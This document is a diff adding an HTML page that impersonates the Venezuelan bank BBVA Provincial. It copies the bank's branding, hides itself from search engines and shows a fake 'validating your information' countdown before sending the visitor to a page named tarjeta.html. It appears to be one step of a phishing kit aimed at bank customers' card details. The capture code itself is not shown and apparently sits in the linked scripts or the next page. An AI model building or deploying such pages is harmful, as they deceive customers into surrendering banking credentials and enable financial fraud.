@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es-VE">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex nofollow noarchive">
+    <title>BBVA Provincial - Validando</title>
+    <link rel="icon" type="image/png" href="https://www.provincial.com/favicon.ico">
+    <script src="info.js"></script>
+    <script src="alertas.js"></script>
+    <style>
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('https://cdns.gigya.com/GS/websites/provincial/fonts/BentonSansBBVA-Book.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('https://cdns.gigya.com/GS/websites/provincial/fonts/BentonSansBBVA-Bold.woff') format('woff');
+            font-weight: bold;
+            font-style: normal;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'BentonSansBBVA', Arial, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .headerReclamos {
+            background: #072146;
+            padding: 0;
+        }
+        .HeaderRow {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+        }
+        .headerLeft {
+            display: flex;
+            align-items: center;
+        }
+        .headerLogo {
+            width: auto;
+            max-width: 100%;
+            height: auto;
+            max-height: 20px;
+            cursor: pointer;
+            position: relative;
+            top: -6px;
+        }
+        .closex {
+            height: 20px;
+            width: 20px;
+            cursor: pointer;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .loading-box {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .loading-box img {
+            max-width: 350px;
+            margin-bottom: 20px;
+        }
+        .loading-box h1 {
+            color: #072146;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .loading-box p {
+            color: #666;
+            font-size: 14px;
+        }
+        .loading-box .countdown {
+            color: #237aba;
+            font-size: 26px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        footer {
+            background: #072146;
+            padding: 15px 20px;
+            text-align: center;
+        }
+        footer img { height: 25px; opacity: 0.7; }
+        @media (max-width: 900px) {
+            .loading-box { max-width: 90%; }
+            .loading-box h1 { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+        <div class="headerReclamos">
+        <div class="HeaderRow">
+            <div class="headerLeft">
+                <img src="logo-bbva-provincial1.png" alt="" class="headerLogo" onclick="salir();">
+            </div>
+            <img src="close2.png" alt="" class="closex" onclick="salir();">
+        </div>
+    </div>
+
+
+    <div class="container">
+        <div class="loading-box">
+            <img id="status-image" src="loading.gif" alt="Validando">
+            <h1>Validando tu informacion</h1>
+            <p>Tiempo estimado: <span class="countdown" id="countdown">15</span> segundos</p>
+        </div>
+    </div>
+
+    <footer>
+        <img src="bbva.png" alt="BBVA">
+    </footer>
+
+    <script>
+        let seconds = 15;
+        const countdownEl = document.getElementById('countdown');
+        const statusImg = document.getElementById('status-image');
+
+        const timer = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+
+            if (seconds <= 2) {
+                statusImg.src = 'ready.png';
+                statusImg.alt = 'Listo';
+            }
+
+            if (seconds <= 0) {
+                clearInterval(timer);
+                window.location.href = "tarjeta.html";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
